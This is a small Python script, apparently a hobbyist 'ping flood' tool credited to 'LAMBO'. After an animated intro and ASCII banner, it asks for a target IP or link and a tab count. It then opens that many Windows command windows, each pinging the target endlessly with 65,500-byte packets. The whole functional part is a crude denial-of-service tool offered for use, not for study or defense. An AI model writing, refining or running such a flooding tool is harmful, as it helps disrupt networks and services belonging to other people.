import os
import time
from colorama import Fore, init
import subprocess

init()
os.system("cls" if os.name == "nt" else "clear")
time.sleep(1)

loading_steps = [
    "T",
    "TH",
    "THI",
    "THIS",
    "THIS ",
    "THIS C",
    "THIS CO",
    "THIS COD",
    "THIS CODE",
    "THIS CODE B",
    "THIS CODE BY",
    "THIS CODE BY ",
    "THIS CODE BY L",
    "THIS CODE BY LA",
    "THIS CODE BY LAM",
    "THIS CODE BY LAMB",
    "THIS CODE BY LAMBO", 
]

for step in loading_steps:
    print(Fore.YELLOW + step)
    time.sleep(0.1)
    os.system("cls")

print(Fore.GREEN + "Enjoy !")
time.sleep(1)
os.system("cls" if os.name == "nt" else "clear")

title = """
 
 ______                              __               __           __  __     _          ___     
/\__  _\        __                  /\ \             /\ \__       /\ \/\ \  /' \       /'___`\   
\/_/\ \/    __ /\_\     __      __  \ \ \____  __  __\ \ ,_\    __\ \ \ \ \/\_, \     /\_\ /\ \  
   \ \ \  /'_ `\/\ \  /'_ `\  /'__`\ \ \ '__`\/\ \/\ \\ \ \/  /'__`\ \ \ \ \/_/\ \    \/_/// /__ 
    \ \ \/\ \L\ \ \ \/\ \L\ \/\ \L\.\_\ \ \L\ \ \ \_\ \\ \ \_/\  __/\ \ \_/ \ \ \ \  __  // /_\ \
     \ \_\ \____ \ \_\ \____ \ \__/.\_\\ \_,__/\/`____ \\ \__\ \____\\ `\___/  \ \_\/\_\/\______/
      \/_/\/___L\ \/_/\/___L\ \/__/\/_/ \/___/  `/___/> \\/__/\/____/ `\/__/    \/_/\/_/\/_____/ 
            /\____/     /\____/                    /\___/                                        
            \_/__/      \_/__/                     \/__/                                                                 
    
        Ping a specific IP with inf packages
"""
print(Fore.GREEN + title)
print("_________________________________")
ipinput = input(Fore.GREEN + "Put in IP/Https link: ")
counts = int(input(Fore.GREEN + "How many tabs(More tabs = faster): "))
print(Fore.GREEN + "_________________________________")

ip = ipinput
bytess = "65500"

print("Program Started.")

time.sleep(3)

for _ in range(counts):
    subprocess.Popen(["cmd", "/c", f"start ping -l {bytess} {ip} -t"], shell=True)
